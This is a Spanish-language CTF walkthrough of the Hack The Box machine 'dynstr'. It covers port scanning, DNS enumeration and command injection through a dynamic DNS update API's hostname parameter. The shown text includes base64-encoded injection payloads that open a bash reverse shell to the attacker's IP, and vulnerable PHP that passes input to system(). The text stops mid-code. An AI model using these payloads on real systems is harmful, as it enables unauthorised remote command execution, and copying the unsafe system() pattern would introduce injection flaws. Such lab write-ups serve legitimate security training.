<!doctype html><html lang="es"><head><title>dynstr | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina utiliza un servicio de DNS dinámico vulnerable a inyección de comandos y existen permisos de sudo en la máquina sobre un comando con un wildcard. Para comprometer la máquina se necesitan conocimientos de DNS, técnicas de inyección de comandos y abuso de wildcard"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina utiliza un servicio de DNS dinámico vulnerable a inyección de comandos y existen permisos de sudo en la máquina sobre un comando con un wildcard. Para comprometer la máquina se necesitan conocimientos de DNS, técnicas de inyección de comandos y abuso de wildcard"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina utiliza un servicio de DNS dinámico vulnerable a inyección de comandos y existen permisos de sudo en la máquina sobre un comando con un wildcard. Para comprometer la máquina se necesitan conocimientos de DNS, técnicas de inyección de comandos y abuso de wildcard"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina utiliza un servicio de DNS dinámico vulnerable a inyección de comandos y existen permisos de sudo en la máquina sobre un comando con un wildcard. Para comprometer la máquina se necesitan conocimientos de DNS, técnicas de inyección de comandos y abuso de wildcard"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina utiliza un servicio de DNS dinámico vulnerable a inyección de comandos y existen permisos de sudo en la máquina sobre un comando con un wildcard. Para comprometer la máquina se necesitan conocimientos de DNS, técnicas de inyección de comandos y abuso de wildcard"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/dynstr/dynstr.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/dynstr/dynstr.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/dynstr/dynstr.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="dynstr"><meta property="twitter:title" content="dynstr"><meta property="og:title" content="dynstr"><meta property="og:url" content="https://7rocky.github.io/htb/dynstr/"><meta itemprop="keywords" content="dns,sudo,wildcard,command-injection,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/dynstr/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/dynstr/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/dynstr/&text=dynstr" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/dynstr/&title=dynstr" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">dynstr</h1><time class="mt4 f6 dib tracked" datetime="2021-10-16T00:00:00+01:00">16 / 10 / 2021</time><br><p class="mb4 f6 dib tracked">11 minutos de lectura</p></header><div class="htb-image"><img alt="dynstr" src="/images/HTB/dynstr/dynstr.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/dns" title="DNS">DNS</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/wildcard" title="<em>Wildcard</em>"><em>Wildcard</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/command-injection" title="Inyección de Comandos">Inyección de Comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#información-general">Información general</a></li><li><a href="#exploración-del-dns">Exploración del DNS</a></li><li><a href="#intrusión-en-la-máquina">Intrusión en la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-bindmgr">Movimiento lateral al usuario <code>bindmgr</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.10.244</li><li><strong>Fecha</strong>: 05 / 06 / 2021</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.244 -p 22,53,80
Nmap scan report for 10.10.10.244
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 15.92 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 53 (DNS) y 80 (HTTP).</p><h2 id="información-general">Información general</h2><p><img src="/images/HTB/dynstr/dynstr-dynadns.png" alt="Banner DYNA DNS"></p><p>Dyna DNS es una empresa que ofrece DNS dinámico a sus clientes. Como sus servicios están aún en pruebas, proporcionan <code>dynadns:sndanyd</code> como credenciales para <em>Basic</em> HTTP <em>Authentication</em> en su API.</p><p>Además, dicen en su página web que la API está diseñada para aceptar peticiones similares a la API REST de <a href="https://www.noip.com/">no-ip.com</a>.</p><p>De momento, constan de los siguientes dominios:</p><ul><li><code>dnsalias.htb</code></li><li><code>dynamicdns.htb</code></li><li><code>no-ip.htb</code></li></ul><p><img src="/images/HTB/dynstr/dynstr-info.png" alt="Servicios de DYNA DNS"></p><h2 id="exploración-del-dns">Exploración del DNS</h2><p>El uso de <code>dig</code> puede ser útil para ver información de los dominios anteriores:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">dig</span> dnsalias.htb dynamicdns.htb no-ip.htb @10.10.10.244

; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; dnsalias.htb dynamicdns.htb no-ip.htb @10.10.10.244
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 53374
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;dnsalias.htb.                  IN      A

;; AUTHORITY SECTION:
.                       600     IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2022071700 1800 900 604800 86400  

;; Query time: 34 msec
;; SERVER: 80.58.61.250#53(80.58.61.250)
;; WHEN: Sun Jul 17 16:43:18 CEST 2022
;; MSG SIZE  rcvd: 116

;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 51687
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;dynamicdns.htb.                        IN      A

;; AUTHORITY SECTION:
.                       600     IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2022071700 1800 900 604800 86400

;; Query time: 45 msec
;; SERVER: 80.58.61.250#53(80.58.61.250)
;; WHEN: Sun Jul 17 16:43:18 CEST 2022
;; MSG SIZE  rcvd: 118

;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 26451
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;no-ip.htb.                     IN      A

;; AUTHORITY SECTION:
no-ip.htb.              60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030303 21600 3600 604800 60

;; Query time: 38 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Sun Jul 17 16:43:18 CEST 2022
;; MSG SIZE  rcvd: 98
</code></pre></div><p>Echando un vistazo a la documentación de la API de <a href="https://www.noip.com/integrate/request">no-ip.com</a>, resulta sencillo generar un nuevo subdominio (usando <em>Basic HTTP Authentication</em>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=asdf.no-ip.htb&myip=10.10.17.44'</span>  
good 10.10.17.44
</code></pre></div><p>Ahora, el subdominio <code>asdf.no-ip.htb</code> debería estar enlazado a la dirección 10.10.17.44:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">dig</span> asdf.no-ip.htb @10.10.10.244

; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; asdf.no-ip.htb @10.10.10.244  
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 26185
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;asdf.no-ip.htb.                        IN      A

;; ANSWER SECTION:
asdf.no-ip.htb.         30      IN      A       10.10.17.44

;; Query time: 43 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Sun Jul 17 16:44:16 CEST 2022
;; MSG SIZE  rcvd: 59
</code></pre></div><h2 id="intrusión-en-la-máquina">Intrusión en la máquina</h2><p>El truco está en que el nombre del subdominio (<code>asdf</code> en el ejemplo anterior) es el único parámetro que podemos introducir en la máquina. Entonces, podemos intentar inyectar algún comando. Como no podemos ver la respuesta del comando, podemos verificar primero que nos podemos conectar a nuestra máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'curl 10.10.17.44'</span> | <span class="code-dark-green">base64</span>
Y3VybCAxMC4xMC4xNy40NAo=

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=`echo+Y3VybCAxMC4xMC4xNy40NAo=|base64+-d|bash`.no-ip.htb&myip=10.10.17.44'</span>  
</code></pre></div><p>Nótese el uso de Base64 para evitar que haya puntos que puedan confundirse con el separador de los subdominios.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.10.244 - - [] "GET / HTTP/1.1" 200 -  
::ffff:10.10.10.244 - - [] "GET / HTTP/1.1" 200 -
</code></pre></div><p>Como puede verse, obtenemos una conexión, por lo que tenemos ejecución remota de comandos (RCE), y por tanto, podemos conseguir una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=`echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx|base64+-d|bash`.no-ip.htb&myip=10.10.17.44'</span>  
</code></pre></div><p>Y así obtenemos acceso como usuario <code>www-data</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.244.
Ncat: Connection from 10.10.10.244:43290.
bash: cannot set terminal process group (794): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@dynstr:/var/www/html/nic$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@dynstr:/var/www/html/nic$ export TERM=xterm
www-data@dynstr:/var/www/html/nic$ export SHELL=bash
www-data@dynstr:/var/www/html/nic$ stty rows 50 columns 158
</code></pre></div><p>Adicionalmente, podemos analizar el código fuente para ver por qué existía RCE:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@dynstr:/var/www/html/nic$ ls -l
total 4
-rw-r--r-- 1 root root    0 Mar 12 19:41 index.html  
-rw-r--r-- 1 root root 1110 Mar 13 19:40 update
www-data@dynstr:/var/www/html/nic$ cat update
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
<span class="mtk1">  </span><span class="mtk3">// Check authentication</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk7">isset</span><span class="mtk1">($_SERVER[</span><span class="mtk4">'PHP_AUTH_USER'</span><span class="mtk1">]) </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">isset</span><span class="mtk1">($_SERVER[</span><span class="mtk4">'PHP_AUTH_PW'</span><span class="mtk1">]))      { </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"badauth</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">; </span><span class="mtk5">exit</span><span class="mtk1">; }</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ($_SERVER[</span><span class="mtk4">'PHP_AUTH_USER'</span><span class="mtk1">]</span><span class="mtk5">.</span><span class="mtk4">":"</span><span class="mtk5">.</span><span class="mtk1">$_SERVER[</span><span class="mtk4">'PHP_AUTH_PW'</span><span class="mtk1">]</span><span class="mtk5">!==</span><span class="mtk4">'dynadns:sndanyd'</span><span class="mtk1">) { </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"badauth</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">; </span><span class="mtk5">exit</span><span class="mtk1">; }</span>

<span class="mtk1">  </span><span class="mtk3">// Set $myip from GET, defaulting to REMOTE_ADDR</span>
<span class="mtk1">  $myip </span><span class="mtk5">=</span><span class="mtk1"> $_SERVER[</span><span class="mtk4">'REMOTE_ADDR'</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ($valid</span><span class="mtk5">=</span><span class="mtk7">filter_var</span><span class="mtk1">($_GET[</span><span class="mtk4">'myip'</span><span class="mtk1">],</span><span class="mtk7">FILTER_VALIDATE_IP</span><span class="mtk1">))                       { $myip </span><span class="mtk5">=</span><span class="mtk1"> $valid; }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($_GET[</span><span class="mtk4">'hostname'</span><span class="mtk1">])) {</span>
<span class="mtk1">    </span><span class="mtk3">// Check for a valid domain</span>
<span class="mtk1">    </span><span class="mtk7">list</span><span class="mtk1">($h,$d) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">"."</span><span class="mtk1">,$_GET[</span><span class="mtk4">'hostname'</span><span class="mtk1">],</span><span class="mtk6">2</span><span class="mtk1">);</span>
<span class="mtk1">    $validds </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">'dnsalias.htb'</span><span class="mtk1">,</span><span class="mtk4">'dynamicdns.htb'</span><span class="mtk1">,</span><span class="mtk4">'no-ip.htb'</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">in_array</span><span class="mtk1">($d,$validds)) { </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"911 [wrngdom: </span><span class="mtk1">$d</span><span class="mtk4">]</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">; </span><span class="mtk5">exit</span><span class="mtk1">; }</span>
<span class="mtk1">    </span><span class="mtk3">// Update DNS entry</span>
<span class="mtk1">    $cmd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">sprintf</span><span class="mtk1">(</span><span class="mtk4">"server 127.0.0.1</span><span class="mtk6">\n</span><span class="mtk4">zone %s</span><span class="mtk6">\n</span><span class="mtk4">update delete %s.%s</span><span class="mtk6">\n</span><span class="mtk4">update add %s.%s 30 IN A %s</span><span class="mtk6">\n</span><span class="mtk4">send</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,$d,$h,$d,$h,$d,$myip); </span>  
<span class="mtk1">    </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">'echo "'</span><span class="mtk5">.</span><span class="mtk1">$cmd</span><span class="mtk5">.</span><span class="mtk4">'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key'</span><span class="mtk1">,$retval);</span>
<span class="mtk1">    </span><span class="mtk3">// Return good or 911</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">$retval) {</span>
